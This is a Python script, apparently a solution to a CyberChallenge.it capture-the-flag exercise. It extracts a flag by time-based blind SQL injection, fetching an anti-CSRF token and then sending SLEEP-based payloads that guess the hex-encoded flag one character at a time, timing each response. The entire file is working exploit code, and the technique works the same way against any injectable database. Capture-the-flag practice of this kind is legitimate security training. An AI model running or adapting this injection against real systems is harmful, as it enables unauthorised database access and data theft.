import requests
import time


class Inj:
    
    def __init__(self, host):
        self.sess = requests.Session()  # Start the session. We want to save the cookies
        self.base_url = '{}/api/'.format(host)
        self._refresh_csrf_token()  # Refresh the ANTI-CSRF token
    
    def _refresh_csrf_token(self):
        resp = self.sess.get(self.base_url + 'get_token')
        resp = resp.json()
        self.token = resp['token']
    
    def _do_raw_req(self, url, query):
        headers = {'X-CSRFToken': self.token}
        data = {'query': query}
        return self.sess.post(url, json=data, headers=headers).json()

    def logic(self, query):
        url = self.base_url + 'logic'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']
    
    def union(self, query):
        url = self.base_url + 'union'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']

    def blind(self, query):
        url = self.base_url + 'blind'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']

    def time(self, query):
        url = self.base_url + 'time'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']

    def check_payload(self, payload):
        before_request = time.time()
        self.time(payload)
        total_time = time.time() - before_request

        if total_time > 1:
            return True
        return False

    def extract_flag(self):
        flag = ""
        hex_chars = "0123456789ABCDEF"
        while True:
            found = False
            for char in hex_chars:
                payload = f"1' AND (SELECT SLEEP(1) FROM flags WHERE HEX(flag) LIKE '{flag}{char}%')='1"
                if self.check_payload(payload):
                    flag += char
                    found = True
                    print(f"Current flag: {flag}")
                    break
            if not found:
                break
        return flag
    def hex_to_string(self, hex_str):
        bytes_object = bytes.fromhex(hex_str)
        return bytes_object.decode("utf-8")


if __name__ == "__main__":
    inj = Inj('http://sqlinjection.challs.cyberchallenge.it/')
    hex_flag = inj.extract_flag()
    print(f"Extracted hex flag: {hex_flag}")
    normal_flag = inj.hex_to_string(hex_flag)
    print(f"Extracted flag: {normal_flag}")